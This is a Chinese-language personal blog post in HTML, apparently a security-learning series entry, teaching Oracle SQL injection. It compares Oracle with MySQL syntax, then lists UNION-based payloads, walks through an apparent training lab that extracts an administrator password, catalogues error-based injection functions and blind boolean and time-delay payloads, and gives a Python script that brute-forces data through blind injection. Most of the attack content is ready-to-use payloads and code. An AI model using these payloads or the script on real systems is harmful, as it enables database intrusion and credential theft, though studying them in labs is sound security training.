@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>三十二，Oracle中SQL注入 | Hexo</title>
+  <meta name="description" content="Oracle SQL注入1，Oracle数据库介绍：Oracle数据库系统是世界上流行的关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小微机环境。它是一种高效率的、可靠性好的、适应高吞吐量的数据库方案。 Oracle服务默认端口：1521 Oracle和MySQL数据库语法大致相同，结构不太相同。 2，Oracle和MySQL的语法差异： Oracle要求select后必">
+<meta property="og:type" content="article">
+<meta property="og:title" content="三十二，Oracle中SQL注入">
+<meta property="og:url" content="http://example.com/2024/01/04/%E4%B8%89%E5%8D%81%E4%BA%8C%EF%BC%8COracle%E4%B8%ADSQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="baiQstar的博客">
+<meta property="og:description" content="Oracle SQL注入1，Oracle数据库介绍：Oracle数据库系统是世界上流行的关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小微机环境。它是一种高效率的、可靠性好的、适应高吞吐量的数据库方案。 Oracle服务默认端口：1521 Oracle和MySQL数据库语法大致相同，结构不太相同。 2，Oracle和MySQL的语法差异： Oracle要求select后必">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040957150.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040957231.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040957233.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040958372.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040958026.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040958216.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040959463.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040959877.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040959272.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040959534.png">
+<meta property="article:published_time" content="2024-01-04T11:17:06.000Z">
+<meta property="article:modified_time" content="2024-01-04T11:19:16.689Z">
+<meta property="article:author" content="白易安">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040957150.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://example.com/2024/01/04/%E4%B8%89%E5%8D%81%E4%BA%8C%EF%BC%8COracle%E4%B8%ADSQL%E6%B3%A8%E5%85%A5/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="baiQstar的博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/baiQstar" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">白易安</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">往事如叶，飘散随风</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Shenzhen, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">项目</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">书单</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/baiQstar" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/cofess" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+
+    
+      
+
+    
+      
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">一月 2024</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">十二月 2023</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">十一月 2023</a><span class="archive-list-count">22</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2024/01/04/%E4%B8%89%E5%8D%81%E5%9B%9B%EF%BC%8Cvulnhub-MONEYBOX-1/" class="title">三十四，vulnhub-MONEYBOX: 1</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-01-04T12:38:29.000Z" itemprop="datePublished">2024-01-04</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2024/01/04/%E4%B8%89%E5%8D%81%E4%B8%89%EF%BC%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="title">三十三，信息收集</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-01-04T11:33:14.000Z" itemprop="datePublished">2024-01-04</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2024/01/04/%E4%B8%89%E5%8D%81%E4%BA%8C%EF%BC%8COracle%E4%B8%ADSQL%E6%B3%A8%E5%85%A5/" class="title">三十二，Oracle中SQL注入</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-01-04T11:17:06.000Z" itemprop="datePublished">2024-01-04</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2024/01/01/%E4%B8%89%E5%8D%81%E4%B8%80%EF%BC%8C%E9%80%9A%E8%BF%87IP%E8%8E%B7%E5%BE%97%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90/" class="title">三十一，通过IP获得服务器权限</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2024-01-01T08:28:46.000Z" itemprop="datePublished">2024-01-01</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2023/12/28/%E4%B8%89%E5%8D%81%EF%BC%8CSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/" class="title">三十，SQL注入绕过</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-12-28T11:41:08.000Z" itemprop="datePublished">2023-12-28</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-三十二，Oracle中SQL注入" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      三十二，Oracle中SQL注入
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2024/01/04/%E4%B8%89%E5%8D%81%E4%BA%8C%EF%BC%8COracle%E4%B8%ADSQL%E6%B3%A8%E5%85%A5/" class="article-date">
+	  <time datetime="2024-01-04T11:17:06.000Z" itemprop="datePublished">2024-01-04</time>
+	</a>
+</span>
+        
+        
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2024/01/04/%E4%B8%89%E5%8D%81%E4%BA%8C%EF%BC%8COracle%E4%B8%ADSQL%E6%B3%A8%E5%85%A5/#comments" class="article-comment-link">评论</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h4><span id="oracle-sql注入">Oracle SQL注入</span></h4><h5><span id="1oracle数据库介绍">1，Oracle数据库介绍：</span></h5><p>Oracle数据库系统是世界上流行的关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小微机环境。它是一种高效率的、可靠性好的、适应高吞吐量的数据库方案。</p>
+<p>Oracle服务默认端口：1521</p>
+<p>Oracle和MySQL数据库语法大致相同，结构不太相同。</p>
+<h5><span id="2oracle和mysql的语法差异">2，Oracle和MySQL的语法差异：</span></h5><ul>
+<li><p>Oracle要求select后必须指明要查询的表名，可以用dual。</p>
+<p>在Oracle中每个库中均存在一张dual表，这个表是虚表，并没有实际的存储意义，它永远只存储一条数据，因为Oracle的SQL语法要求select后必须跟上from，所以我们通常使用dual来作为计算、查询时间等SQL语句中from之后的虚表占位。</p>
+<p>’a‘ 必须要和数据的类型一致，负责报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union selecct &#x27;a&#x27;,&#x27;b&#x27; from dual--+</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040957150.png" alt="image-20240103193001440"></p>
+<ul>
+<li><p>Oracle使用 || 拼接字符串，MySQL中为或运算。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union selecct &#x27;a&#x27;||&#x27;a&#x27;,&#x27;b&#x27; from dual--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040957231.png" alt="image-20240103193315338"></p>
+</li>
+<li><p>单引号和双引号在Oracle中虽然都是字符串，但是双引号可以用来消除关键字，比如sysdate，不能使用保留字作为用户定义的变量，但是当加上双引号就可以。</p>
+</li>
+<li><p>Oracle中没有空字符，’‘和’null’都是null，而MySQL中认为’’仍然是一个字符串。</p>
+</li>
+</ul>
+<h5><span id="3oracle的重点系统表">3，Oracle的重点系统表</span></h5><p>– dba_tables : 系统里所有的表的信息，需要DBA权限才能查询<br>– all_tables : 当前用户有权限的表的信息<br>– user_tables: 当前用户名下的表的信息<br>– DBA_ALL_TABLES：DBA 用户所拥有的或有访问权限的对象和表<br>– ALL_ALL_TABLES：某一用户拥有的或有访问权限的对象和表<br>– USER_ALL_TABLES：某一用户所拥有的对象和表</p>
+<h5><span id="4oracle常用信息查询方法">4，oracle常用信息查询方法</span></h5><p>1、获取数据库版本信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT banner FROM v$version WHERE banner LIKE &#x27;Oracle%25&#x27;;</span><br><span class="line">&#x27;SELECT banner,null FROM v$version WHERE banner LIKE &#x27;Oracle%25&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040957233.png" alt="image-20240103195721601"></p>
+<p>2、获取操作系统版本信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT banner FROM v$version WHERE banner LIKE &#x27;TNS%25&#x27;;</span><br><span class="line">&#x27;SELECT banner,null FROM v$version WHERE banner LIKE &#x27;TNS%25&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040958372.png" alt="image-20240103195739315"></p>
+<p>3、获取当前数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM v$database;</span><br><span class="line">/全局数据库名</span><br><span class="line">&#x27; union select (SELECT global_name FROM global_name),null from dual --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040958026.png" alt="image-20240103201603612"></p>
+<p>4,获取数据库用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT user FROM dual;</span><br><span class="line">获取所有数据库用户</span><br><span class="line">SELECT username FROM all_users;</span><br><span class="line">SELECT name FROM sys.user$; -- 需要高权限</span><br></pre></td></tr></table></figure>
+
+<p>6,获取当前用户权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM session_privs;</span><br></pre></td></tr></table></figure>
+
+<p>7,获取当前用户有权限的所有数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT owner, table_name FROM all_tables;</span><br></pre></td></tr></table></figure>
+
+<p>8,获取表，all_tables类似于MySQL中的information_schema.tables</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT owner, table_name FROM all_tables;</span><br></pre></td></tr></table></figure>
+
+<p>9,获取字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name FROM all_tab_columns;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5><span id="5通过burp-labs第六关">5,通过burp labs第六关</span></h5><p>1，确定闭合—‘单引号字符型闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--</span><br><span class="line">’--</span><br></pre></td></tr></table></figure>
+
+<p>2，确定返回列数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order by 3</span><br><span class="line">order by 2</span><br></pre></td></tr></table></figure>
+
+<p>3,找出所有表名称–<strong>USERS_AYGHUL</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql：</span><br><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=database();</span><br><span class="line">oracle：</span><br><span class="line">SELECT table_name FROM all_tables;</span><br><span class="line">&#x27; union select table_name,null from all_tables--</span><br><span class="line">USERS_OQVBCS</span><br><span class="line">PASSWORD_HRMFUV</span><br><span class="line">USERNAME_PUGXDV</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040958216.png" alt="image-20240103203034892"></p>
+<p>4,找出该表的列名–<strong>USERNAME_UXMKVN</strong>,<strong>PASSWORD_XPUKYX</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql：</span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database();</span><br><span class="line">oracl:</span><br><span class="line">SELECT column_name FROM all_tab_columns;</span><br><span class="line">&#x27; union select column_name,null FROM all_tab_columns where table_name=&#x27;USERS_OQVBCS&#x27;--</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040959463.png" alt="image-20240103203403152"></p>
+<p>5,找出用户表中的所有数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql:</span><br><span class="line">select group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from users ;</span><br><span class="line">oracl:</span><br><span class="line">select name,password from users;</span><br><span class="line">&#x27; union select USERNAME_PUGXDV,PASSWORD_HRMFUV from USERS_OQVBCS--</span><br><span class="line">administrator</span><br><span class="line">kxiw0je1gupg2dxe5y1t</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040959877.png" alt="image-20240103203810074"></p>
+<p>6,登录成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040959272.png" alt="image-20240103203934349"></p>
+<h5><span id="6报错注入">6，报错注入</span></h5><p>报错注入常用函数：</p>
+<p>1、utl_inaddr.get_host_name</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select utl_inaddr.get_host_name((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+
+<p>11g之后，使用此函数的数据库用户需要有访问网络的权限</p>
+<p>11g之后，使用此函数的数据库用户需要有访问网络的权限</p>
+<p>2、ctxsys.drithsx.sn</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ctxsys.drithsx.sn(1, (select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+
+<p>处理文本的函数，参数错误时会报错。</p>
+<p>3、CTXSYS.CTX_REPORT.TOKEN_TYPE</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select CTXSYS.CTX_REPORT.TOKEN_TYPE((select user from dual), &#x27;123&#x27;) from dual;</span><br></pre></td></tr></table></figure>
+
+<p>4、XMLType</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&#x27; and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --+</span><br></pre></td></tr></table></figure>
+
+<p>注意url编码，如果返回的数据有空格的话，它会自动截断，导致数据不完整，这种情况下先转为 hex，再导出。</p>
+<p>5、dbms_xdb_version.checkin</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xdb_version.checkin((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+
+<p>6、dbms_xdb_version.makeversioned</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xdb_version.makeversioned((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+
+<p>7、dbms_xdb_version.uncheckout</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xdb_version.uncheckout((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+
+<p>8、dbms_utility.sqlid_to_sqlhash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+
+<p>9、ordsys.ord_dicom.getmappingxpath</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ordsys.ord_dicom.getmappingxpath((select user from dual), 1, 1) from dual;</span><br></pre></td></tr></table></figure>
+
+<p>10、UTL_INADDR.get_host_name</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select UTL_INADDR.get_host_name((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+
+<p>11、UTL_INADDR.get_host_address</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select UTL_INADDR.get_host_name(&#x27;~&#x27;||(select user from dual)||&#x27;~&#x27;) from dual;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5><span id="7布尔盲注">7,布尔盲注</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and (SELECT substr(user,1,1)FROM dual) &gt;&#x27;!&#x27;--</span><br><span class="line">’ union select user,null from dual --</span><br></pre></td></tr></table></figure>
+
+<p>通过decode配合除数为0来进行布尔盲注，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&#x27; and 1=(select decode(substr(user, 1, 1), &#x27;S&#x27;, (1/1),0) from dual) --+</span><br></pre></td></tr></table></figure>
+
+
+
+<h5><span id="8时间盲注">8，时间盲注</span></h5><p>时间延迟函数：DBMS_PIPE.RECEIVE_MESSAGE()函数<br>dbms_pipe.receive_message(‘RDS’, 10) #将为从RDS管道返回的数据等待10秒。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 from dual where DBMS_PIPE.RECEIVE_MESSAGE(&#x27;asd&#x27;, REPLACE((SELECT substr(user, 1, 1) FROM dual), &#x27;S&#x27;, 10))=1;</span><br></pre></td></tr></table></figure>
+
+<p>还可以配合decode：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select decode(substr(user,1,1),&#x27;S&#x27;,dbms_pipe.receive_message(&#x27;RDS&#x27;,10),0) from dual;</span><br></pre></td></tr></table></figure>
+
+<p>python代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"># 忽略警告：当你的Python程序通过requests发送一个HTTPS请求但没有验证服务器证书时，urllib3会发出InsecureRequestWarning警告。</span><br><span class="line">resu=&#x27;Babbage Web Spray&#x27;</span><br><span class="line">name = &#x27;&#x27;</span><br><span class="line">url1 = &quot;https://0a0f0055049ec60881ee76b500e700ea.web-security-academy.net/filter?category=Pets&#x27;&quot;</span><br><span class="line">proxies = &#123;</span><br><span class="line">        &quot;http&quot;: &quot;http://127.0.0.1:7890&quot;,</span><br><span class="line">        &quot;http&quot;: &quot;https://127.0.0.1:7890&quot;,</span><br><span class="line">        &#125;</span><br><span class="line"># 代理</span><br><span class="line">for j in range(1, 10):</span><br><span class="line">    for i in range(65, 123):</span><br><span class="line">        url=url1+&quot; and (select substr(user,&quot;+str(j)+&quot;,1) from dual)=&#x27;&quot;+chr(i)+&quot;&#x27;--&quot;</span><br><span class="line">        response = requests.get(url=url,proxies=proxies,verify=False)</span><br><span class="line">        # SSL证书验证：服务器的SSL证书可能未被客户端信任。如果你确认可以接受不验证服务器证书的安全风险（仅限开发环境），可以在请求时添加verify=False参数</span><br><span class="line">        con = response.text</span><br><span class="line">        if resu in con:</span><br><span class="line">            name = name+chr(i)</span><br><span class="line">            print(name)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401040959534.png" alt="image-20240104094702412"></p>
+<h5><span id="9oracle的decode函数">9,oracle的decode函数</span></h5><p><a target="_blank" rel="noopener" 